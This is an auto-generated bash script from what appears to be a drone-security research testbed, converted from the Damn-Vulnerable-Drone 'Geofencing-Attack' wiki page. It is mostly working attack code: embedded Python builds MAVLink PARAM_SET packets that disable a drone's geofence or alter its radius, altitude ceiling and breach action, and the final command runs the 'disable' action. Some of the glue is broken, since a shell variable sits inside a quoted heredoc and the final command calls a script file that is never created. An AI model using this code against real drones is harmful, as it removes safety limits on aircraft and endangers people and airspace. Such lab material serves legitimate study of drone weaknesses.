#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Geofencing-Attack.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition
# This block dynamically queries the MTD interface for an active target.
# ==========================================================
echo "INFO: Querying MTD interface for active target..."

# --- Project Root Resolution ---
# 1. 현재 실행되는 쉘 스크립트의 실제 위치를 찾습니다.
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
# 2. 'dvd_lite' 폴더를 포함하는 프로젝트 루트 디렉토리를 찾습니다. (현재 위치에서 4단계 위)
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")
# -----------------------------

# PYTHONPATH 환경 변수 대신, 직접 프로젝트 루트로 이동하여 파이썬 모듈을 실행합니다.
# 이 방식은 'sudo'가 환경 변수를 초기화하는 문제를 우회할 수 있어 더 안정적입니다.
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
popd > /dev/null

if [ $? -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

# 콜론을 기준으로 IP와 PORT를 분리하여 변수에 저장합니다.
TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

echo "INFO: Active target acquired -> ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=geofencing-attack src=Geofencing-Attack.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:${TARGET_PORT}')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
from scapy.all import *
import sys
import socket

def set_param(mav, param_id, param_value, param_type):
    return mav.param_set_encode(
        target_system=mav.target_system,
        target_component=mav.target_component,
        param_id=param_id.encode('utf-8'),
        param_value=param_value,
        param_type=param_type
    ).pack(mav)

def send_mavlink_packet_tcp(packet_data, target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.send(packet_data)
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python geo-fencing.py <ip:port> <action>")
        print("Actions: disable, enable, set_radius:<value>, set_alt_max:<value>, set_action:<value>")
        sys.exit(1)

    target = sys.argv[1]
    action = sys.argv[2]
    target_ip, target_port = target.split(':')
    target_port = int(target_port)

    mav = mavutil.mavlink.MAVLink(None)
    mav.target_system = 1
    mav.target_component = 1

    if action == "disable":
        packet = set_param(mav, 'FENCE_ENABLE', 0, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print("Geofence disabled")
    elif action == "enable":
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print("Geofence enabled")
    elif action.startswith("set_radius:"):
        value = float(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_RADIUS', value, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence radius set to {value} meters")
    elif action.startswith("set_alt_max:"):
        value = float(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_ALT_MAX', value, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence maximum altitude set to {value} meters")
    elif action.startswith("set_action:"):
        value = int(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_ACTION', value, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence breach action set to {value}")
    else:
        print("Invalid action. Actions: disable, enable, set_radius:<value>, set_alt_max:<value>, set_action:<value>")
        sys.exit(1)
PY

log "[BLOCK 2] type=shell"
sudo python3 geo-fencing.py ${TARGET_IP}:${TARGET_PORT} disable

